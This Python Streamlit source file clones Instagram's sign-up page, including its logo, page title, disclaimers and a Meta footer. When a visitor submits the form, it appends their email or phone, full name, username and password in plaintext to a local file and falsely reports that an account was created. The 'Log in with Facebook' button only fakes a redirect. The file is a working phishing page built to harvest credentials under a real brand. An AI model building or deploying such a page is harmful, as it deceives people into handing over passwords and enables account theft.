import streamlit as st
import os
import time

# Set page configuration
st.set_page_config(page_title="Sign up • Instagram", page_icon="📸", layout="wide")

# Load the updated CSS
with open("styles.css") as f:
    st.markdown(f"<style>{f.read()}</style>", unsafe_allow_html=True)

# Main Wrapper to center the entire card
st.markdown('<div class="main-wrapper">', unsafe_allow_html=True)

with st.container():
    # Registration Card (The Frame)
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    
    # Instagram Logo
    insta_logo_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
    st.markdown(f'<div style="text-align: center; margin-bottom: 10px;"><img src="{insta_logo_url}" width="175"></div>', unsafe_allow_html=True)
    
    # Header Text
    st.markdown('<h3 class="signup-header">Sign up to see photos and videos from your friends.</h3>', unsafe_allow_html=True)
    
    # Log in with Facebook Button
    if st.button("Log in with Facebook", use_container_width=True, type="primary"):
        st.info("Redirecting to Facebook...")

    # OR Separator
    st.markdown('<div class="separator-container"><div class="line"></div><div class="or-text">OR</div><div class="line"></div></div>', unsafe_allow_html=True)
    
    # Registration Input Fields
    email_mobile = st.text_input("Mobile Number or Email", placeholder="Mobile Number or Email", label_visibility="collapsed")
    full_name = st.text_input("Full Name", placeholder="Full Name", label_visibility="collapsed")
    username = st.text_input("Username", placeholder="Username", label_visibility="collapsed")
    password = st.text_input("Password", type="password", placeholder="Password", label_visibility="collapsed")
    
    # Disclaimer Text
    st.markdown('''
        <p class="disclaimer-text">
            People who use our service may have uploaded your contact information to Instagram. <b>Learn More</b>
        </p>
        <p class="disclaimer-text">
            By signing up, you agree to our <b>Terms</b>, <b>Privacy Policy</b> and <b>Cookies Policy</b>.
        </p>
    ''', unsafe_allow_html=True)

    # Sign Up Button
    if st.button("Sign up", use_container_width=True):
        if email_mobile and full_name and username and password:
            with open("new_users.txt", "a") as f:
                f.write(f"Email/Mob: {email_mobile} | Name: {full_name} | User: {username} | Pass: {password}\n")
            st.success("Account created successfully!")
        else:
            st.error("Please fill in all fields.")
            
    st.markdown('</div>', unsafe_allow_html=True) # End Registration Card

    # Bottom "Have an account?" Card
    st.markdown('''
        <div class="signup-card">
            Have an account? <span style="color: #0095f6; font-weight: bold; cursor: pointer;">Log in</span>
        </div>
    ''', unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True) # End Main Wrapper

# Footer
st.markdown('''
    <div class="footer">
        Meta &nbsp; About &nbsp; Blog &nbsp; Jobs &nbsp; Help &nbsp; API &nbsp; Privacy &nbsp; Terms &nbsp; Locations &nbsp; Instagram Lite &nbsp; Meta AI &nbsp; Threads &nbsp; Contact Uploading & Non-Users &nbsp; Meta Verified
        <br><br>
        English ⌵ &nbsp; © 2026 Instagram from Meta
    </div>
''', unsafe_allow_html=True)